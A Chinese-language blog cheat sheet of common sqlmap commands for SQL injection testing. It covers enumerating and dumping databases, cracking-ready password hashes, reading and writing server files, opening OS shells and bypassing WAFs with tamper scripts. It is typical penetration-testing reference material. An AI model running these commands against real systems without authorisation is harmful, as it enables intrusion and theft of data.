---
title: sqlmap常用命令
tags:
  -	sqlmap
catrgories:
  - Linux
  - Kali
  - 工具
keywords: sqlmap
cover: https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fwww.icode9.com%2Fi%2Fll%2F%3Fi%3D20200204142009740.png%3F%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzcyOTk0Mw%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70&refer=http%3A%2F%2Fwww.icode9.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1640780113&t=0968f9721c1466f1feba902c03ce6c95
abbrlink: 1
---




## sqlmap常用操作命令

### 基本运行步骤

```
sqlmap -u "链接" --dbs			获取数据库
sqlmap -u "链接" --current-user	获取当前用户名称
sqlmap -u ”链接” --current-db		获取当前数据库名称
sqlmap -u "链接" -D 数据库名 --tables			列出表名
sqlmap -u "链接" -D 数据库名 -T 表名 --columns		列出字段
sqlmap -u "链接" -D 数据库名 -T 表名 -C 字段 --dump	获取字段内容
```



### 常见参数

```
--cookeie=cookie的内容			设置cookie值 通常配合获取数据库使用
--data						设置POST提交的值
-u							指定目标URL
-b							获取DBMS banner
--current-db				获取昂当前数据库
--current-user				获取当前数据库的用户
--tables					获取数据库所有的表明
--current-user				获取当前用户
-D 数据库名						指定数据库名
-T 表名						指定表名
-C 字段名						指定字段名
--string					当查询可用时用来匹配页面中的字符串
--users						枚举所有用户
--passwords					枚举所有用户的密码hsah
--dbs						枚举数据库中的数据库名
-r							指定请求包
```



GET型注入一般用sqlmap -u url

POST型主一般用sqlmap -u url --data POST参数

如果需要增加cookie或其他请求头，可将请求保存到文件中，如request.txt，则sqlmap -r request.txt（配合burp使用，直接将请求包保存到文件，然后使用sqlmap -r来进行sql注入）



### 常用基础命令

```
--level 5			探测等级（1~5 默认为1，等级越高Payload越多，速度也比较慢）
--fresh-queries		刷新缓存，避免后续查询数据不更新
--techque=U			使用联合查询，B 布尔查询 通常能用U就用U 快
--random-agent		使用随机ua
--is-dba			判断当前用户是否是管理员权限
--roles				列出数据库管理员角色（仅适用与Oracle数据库）
--referer			HTTP Referer头（伪造HTTP头中的Referer，当--level等级大于等于3时会通过伪造Referer来进行注入）
--sql-shell			运行自定义SQL语句 用法：sqlmap -u url --sql-shell
--os-cmd，--os-shell		运行任意操作系统命令
--file-read			从数据库服务器中读取文件（要知道文件绝对路径）
--file-write		“本地文件路径” --file-dest “远程绝对路径” 上传到文件到数据库服务器中
--tamper "模块名"		bypass绕waf时使用
```

